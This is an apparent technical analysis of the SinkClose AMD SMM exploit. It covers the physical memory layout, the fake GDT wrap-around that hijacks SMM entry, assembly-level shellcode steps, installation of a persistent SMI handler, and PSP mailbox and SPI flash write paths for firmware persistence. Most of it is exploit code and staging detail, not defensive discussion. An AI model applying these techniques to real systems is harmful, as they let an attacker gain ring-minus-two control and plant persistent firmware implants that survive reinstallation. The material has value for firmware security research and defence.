# SinkClose Shellcode and x64 Staging Analysis -- Phase 6

## Physical Memory Layout (from sinkclose.cpp)

```
Physical Address  Contents
0x00000000        FAKE_GDT[1:]  (all but first null descriptor)
0x00001000        core0_shell (32-bit SMM entry shellcode)
0x00002000        Page table base (CORE0_PAGE_TABLE_BASE)
0x00003000        Core1 shellcode + recover area
0x00003200        Core1 recovery values (RIP, RSP, RBP, CR3 -- 4x qword pairs)
0x00003220        CORE1_MUTEX_SIGNAL_ADDR (sync point)
```

---

## Fake GDT Wrap-Around Mechanism

### The Core Trick
```c
UINT32 gdt_cs_base = 0x100000000 - (smm_entry_point_core0 + 0x53) + CORE0_SHELLCODE_ADDRESS;
```

This computes a 32-bit base for GDT entry[1] (Code Segment) such that:
```
cs_base + 0x53 + smm_entry_point_core0 = 0x100000000
```
Which wraps around to `0x00000000 + CORE0_SHELLCODE_ADDRESS = 0x1000`.

So when the CPU uses this CS descriptor and computes:
```
linear_addr = cs_base + offset = wraps to 0x1000
```
The CPU jumps to physical address 0x1000 -- our shellcode -- instead of the real SMM entry point.

### GDTR Programming
The fake GDTR is placed such that the CPU loads it during SMM entry:
```
FAKE GDT at phys 0x00000000 (GDT[1:] -- skipping null descriptor)
GDTR.base = 0xFFFFFFFF  (wraps to 0x00000000 in 32-bit)
GDTR.limit = sizeof(FAKE_GDT) - 1
```

The SPI BAR relocation overlaps the SMM save state area so that when the CPU
writes the GDTR during SMM entry, it reads the fake GDTR instead of the real one.

### FAKE_GDT Contents
```
0x00: NULL descriptor
0x08: Code32 DPL0 (limit=0xFFFF, base=gdt_cs_base, G=1, D=1)
0x10: Code32 DPL0 (duplicate)
0x18: Data32 DPL0
0x20: Data32 DPL0 (duplicate)
0x28: Code16
0x30: Data16
0x38: Code64 (for long mode transition)
0x40: TSS (base=0xD0310800, points near SQUIRREL_BAR for debug)
0x48: Data64
```

---

## core0_shell (sinkclose.s) -- Step by Step

**Executed in SMM on Core 0 after the wrap-around redirect.**

```asm
; Step 1: Clear TClose (MUST clear before RSM or system crashes)
mov ecx, 0xC0010113    ; SMMMask
rdmsr
and eax, 0xFFFFFFF3   ; Clear bits[3:2] = TClose[3] + AClose[2]
wrmsr                  ; TClose disabled

; Step 2: Reload segment registers with flat 32-bit descriptors
mov ax, PROTECT_MODE_DS (0x20)
mov ds/es/fs/gs/ss, ax
mov esp, 0x1E00        ; stack below shellcode at 0x1E00

; Step 3: Reload GDT with clean descriptors (from ORIGINAL_GDTR at phys 0x400)
mov ecx, 0x1400        ; = ORIGINAL_GDTR physical address
lgdt [ecx]             ; load saved real GDT

; Step 4: Far return to next_stage (protected mode, CS=0x08)
push PROTECT_MODE_CS
push CORE0_NEXT_STAGE (0x1035)
retf

; Step 5: ProtFlatMode (still 32-bit protected)
mov eax, 0x2000        ; page table base
mov cr3, rax
mov cr4, 0x668         ; enable PAE (bit 5) + PSE (bit 4) + DE (bit 3)

; Step 6: Load TSS
sgdt [rsp]
clear busy bit in TSS descriptor
ltr TSS_SEGMENT (0x40)

; Step 7: Enable long mode (LME in IA32_EFER)
rdmsr IA32_EFER (0xC0000080)
or ah, 1               ; LME
wrmsr
or cr0, 0x80010023     ; enable paging + WP + NE + MP + PE

; Step 8: Far return to @LongMode (64-bit CS=0x38)
retf

; Step 9: @LongMode -- set up 64-bit stack
mov rsp, X64_STAGING_RSP + 0xF00   ; = 0xfffff6fb7dbef000 + 0xF00

; Step 10: Call x64_staging_func
call X64_STAGING_FUNC_VA            ; = 0xfffff6fb7dbee000

; Step 11: Return from SMM
rsm
```

---

## x64_staging_func -- Persistent SMI Handler Installation

**Runs in 64-bit long mode inside SMM context, with full paging.**

```
1. Locate SMST signature (0x53545332 = 'TSS2') by linear scan of TSEG:
   while (*ptr != MM_MMST_SIGNATURE && ptr != tseg_end) ptr++;

2. Resolve SMST function pointers:
   SMST + 0x50  = SmmAllocatePool
   SMST + 0xD0  = SmmLocateProtocol
   SMST + 0xE0  = SmiHandlerRegister

3a. If INSTALL_FCH_SMI_HANDLER:
    - Locate EFI_SMM_SW_DISPATCH2_PROTOCOL (GUID 18a3c6dc-5eea-48c8-...)
    - Allocate pool for handler: SmmAllocatePool(RuntimeCode, handler_size, &dst)
    - Memcpy smi_handler into pool
    - Register: SwDispatch->Register(SwDispatch, smi_handler, {SW_SMI=0x69}, &handle)

3b. If INSTALL_ROOT_SMI_HANDLER:
    - SmiHandlerRegister(SINKCLOSE_SMI_HANDLER_VADDR, &guid, &handle)
    - Registers a catch-all root SMI handler at a pre-mapped virtual address
```

After this completes: every subsequent SW SMI 0x69 will call the installed handler
from within the legitimate SMST framework. This gives **persistent ring-3** SMI handler
access that survives across normal OS operation.

---

## PSP C2P Mailbox Protocol (from CcxSmm disassembly)

### PSPADDR Enable Sequence
From CcxSmm blob+0x9a1d (identified via RDMSR/WRMSR 0xC001100A):
```asm
MOV RCX, 0xC001100A   ; PSPADDR MSR
RDMSR                  ; EAX = PSPADDR[31:0], EDX = PSPADDR[63:32]
AND RAX, 0xFFFFFFFFFFFFFFFF  ; no-op (compiler artifact -- mask already 64-bit)
OR  RAX, 0x1           ; set bit[0] = enable PSP MMIO window
WRMSR                  ; re-enable PSP MMIO
MOV RAX, 0xB2          ; SW SMI port (used as PSP command register index?)
INT1                   ; ICEBP -- PSP command trigger via debug exception
```

The `INT1 (F1)` after `MOV RAX, 0xB2` is a Platbox-specific debug mechanism, not
a real BIOS instruction. In the actual BIOS, the PSP C2P mailbox is written directly
via MMIO after enabling the PSPADDR window.

### C2P Mailbox Register Map (PSP MMIO, confirmed by 0x10570 constant in CcxSmm)
```
PSPADDR_BASE + 0x10570  PSP_MBOX_COMMAND    Write: command byte (e.g., 0x4D = APCB write)
PSPADDR_BASE + 0x10574  PSP_MBOX_STATUS     Read: bit[31]=0 means command complete
PSPADDR_BASE + 0x10578  PSP_MBOX_BUFFER_LO  Buffer physical address [31:0]
PSPADDR_BASE + 0x1057C  PSP_MBOX_BUFFER_HI  Buffer physical address [63:32]
```

### APCB Write-Back Flow
```
CcxSmm AmdPspWriteBackApcbShadowCopy():
  1. RDMSR 0xC001100A -> get PSPADDR
  2. OR PSPADDR, 0x1 -> enable MMIO -> WRMSR
  3. Write phys addr of APCB shadow buffer to MBOX_BUFFER_LO/HI
  4. Write command 0x4D to MBOX_COMMAND (APCB flash write)
  5. Poll MBOX_STATUS until bit[31] = 0 (done, timeout ~100ms)
  6. PSP ARM core validates APCB against BDT whitelist -> writes to SPI flash
  7. Return status to x86 caller
```

### SW SMI Trigger (confirmed from sinkclose.cpp)
```c
// FCH ACPI PM SW SMI register = port 0xB2
// Writing SMI number triggers a hardware SMI to all cores
_swsmi(): outb(smi_number, 0xB2);
// Platbox uses SMI number 0x69 (SINKCLOSE_SW_SMI_NUMBER)
```

CcxSmm uses different FCH SMI codes (0x33, 0x02 at port 0x80) for FCH-internal
ACPI events, not the SW SMI mechanism used by the exploit.

---

## S3 Boot Script SPI Save/Restore

The string `R S3 SAVE Script: Address 0x%08x, Width 0x%08x` was found in:
- FV2+0x339f34 at sub-offset 0x7362
- FV2+0x343010 at sub-offset 0x340A
- FV2+0x3472dc at sub-offset 0x566A

These modules save FCH register state to the ACPI S3 boot script during normal boot,
then restore it on S3 resume. This confirms that SPI BAR protection register state
(SPIRestrictedCmd, AltSPICS) is restored during S3 resume -- meaning if SinkClose
is used to modify SPI protection, the changes survive only until the next S3 cycle
unless the boot script itself is patched.

### Implication for SinkClose SPI Write
```
SinkClose path for SPI write:
  1. Enter SMM via TClose exploit
  2. Clear SPIRestrictedCmd (0xFEC10004) from SMM -- requires SpiProtectLock=0
  3. Write directly to SPI via FCH SPI BAR (0xFEC10000)
  4. Optionally: patch S3 boot script to prevent restore of RestrictedCmd
  
If SpiProtectLock=1 (AltSPICS bit[5] set):
  Must use PSP C2P mailbox instead:
  1. Enter SMM via TClose exploit
  2. Register persistent handler via x64_staging_func
  3. Handler calls AmdPspWriteBackApcbShadowCopy() with modified APCB
  4. PSP validates against BDT and writes APCB region to SPI
```
